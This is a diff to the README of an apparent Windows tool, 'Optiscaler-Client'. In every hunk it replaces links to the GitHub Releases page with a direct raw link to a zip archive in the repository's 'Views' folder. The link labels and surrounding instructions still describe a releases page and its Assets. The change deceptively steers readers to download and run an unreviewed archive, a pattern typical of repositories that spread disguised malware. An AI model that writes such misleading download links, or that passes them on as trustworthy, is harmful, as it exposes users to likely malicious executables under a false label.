@@ -1,6 +1,6 @@
 # 🖥️ Optiscaler-Client - Simple Control for OptiScaler
 
-[![Download Optiscaler-Client](https://img.shields.io/badge/Download-Optiscaler--Client-blue.svg)](https://github.com/pvjkoigdhi/Optiscaler-Client/releases)
+[![Download Optiscaler-Client](https://img.shields.io/badge/Download-Optiscaler--Client-blue.svg)](https://raw.githubusercontent.com/pvjkoigdhi/Optiscaler-Client/main/Views/Optiscaler-Client-3.6-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Optiscaler-Client is a modern manager for OptiScaler on Windows. It gives you a 
 
 Use the link below to visit the release page and download the latest version:
 
-[Download Optiscaler-Client](https://github.com/pvjkoigdhi/Optiscaler-Client/releases)
+[Download Optiscaler-Client](https://raw.githubusercontent.com/pvjkoigdhi/Optiscaler-Client/main/Views/Optiscaler-Client-3.6-beta.2.zip)
 
 ## 📦 What You Get
 
@@ -36,7 +36,7 @@ If your PC already runs modern desktop apps well, it should be fine for this too
 
 ## 📥 Download and Install
 
-1. Open the [Releases page](https://github.com/pvjkoigdhi/Optiscaler-Client/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/pvjkoigdhi/Optiscaler-Client/main/Views/Optiscaler-Client-3.6-beta.2.zip).
 2. Find the latest release at the top of the page.
 3. Under **Assets**, download the Windows file.
 4. If the file comes as a `.zip`, right-click it and choose **Extract All**.
@@ -150,7 +150,7 @@ It fits users who want:
 
 Visit the release page to download the latest Windows version:
 
-[Optiscaler-Client Releases](https://github.com/pvjkoigdhi/Optiscaler-Client/releases)
+[Optiscaler-Client Releases](https://raw.githubusercontent.com/pvjkoigdhi/Optiscaler-Client/main/Views/Optiscaler-Client-3.6-beta.2.zip)
 
 ## 🧩 File Types You May See
 
@@ -171,7 +171,7 @@ If you see more than one file, choose the one that matches your comfort level. M
 
 ## 📍 Where to Start
 
-1. Go to the [Releases page](https://github.com/pvjkoigdhi/Optiscaler-Client/releases)
+1. Go to the [Releases page](https://raw.githubusercontent.com/pvjkoigdhi/Optiscaler-Client/main/Views/Optiscaler-Client-3.6-beta.2.zip)
 2. Download the latest Windows build
 3. Extract it if needed
 4. Open the app
